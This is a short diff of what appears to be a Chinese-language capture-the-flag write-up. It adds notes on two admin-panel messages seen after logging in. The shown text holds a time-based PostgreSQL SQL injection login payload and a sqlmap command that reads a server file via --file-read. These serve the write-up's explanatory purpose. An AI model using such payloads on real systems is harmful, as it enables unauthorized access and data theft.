@@ -205,9 +205,14 @@ Table: users
 > admin：admin#';SELECT PG_SLEEP(5)--
 > passwd：随便
 
-```
+登录后台以后有两个留言信息:
 
-```
+> Server is currently stable
+>The server is running normally and no issues have recently been detected. If you notice an outage, please report it to the administrator.
+
+
+> Send credentials to Tony Update Printer Drivers
+
 
 sqlmap -r data --batch --dbms=PostgreSQL --force-ssl  --no-cast --threads 4  --file-read "/var/www/admin/info.php"
 
